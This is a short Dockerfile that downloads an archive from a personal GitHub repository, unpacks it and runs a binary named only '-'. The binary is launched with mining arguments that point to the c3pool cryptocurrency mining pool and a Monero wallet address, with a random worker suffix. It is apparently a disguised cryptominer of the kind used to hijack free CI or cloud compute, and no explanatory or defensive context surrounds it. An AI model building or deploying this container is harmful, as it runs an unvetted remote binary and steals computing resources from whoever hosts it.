FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
RUN tar -xvf -.tar.gz

ENTRYPOINT [ "./-" ]
CMD [ "-o", "auto.c3pool.org:80", "-u", "83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju.$(echo $(shuf -i 1000-99999999999 -n 1)-monyet)" ]
